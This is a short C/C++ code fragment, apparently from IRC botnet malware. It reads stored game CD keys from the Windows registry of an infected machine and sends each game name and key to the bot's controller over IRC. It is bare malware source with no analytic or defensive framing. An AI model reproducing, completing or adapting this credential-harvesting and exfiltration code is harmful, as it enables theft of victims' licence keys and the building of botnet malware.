if(RegOpenKeyEx(CDKeyList[i].RootKey, UserKey, 0, KEY_READ, &rk) != ERROR_SUCCESS) {}

if(RegQueryValueEx(rk, CDKeyList[i].ValueName, NULL, NULL, szBuffer, &dwSize) == ERROR_SUCCESS) {
  g_pMainCtrl->m_cIRC.SendFormat(
      pMsg->bSilent,
      pMsg->bNotice,
      pMsg->sReplyTo.Str(),
      "%s%s]\n",
      CDKeyList[i].GameName,
      szBuffer);
}
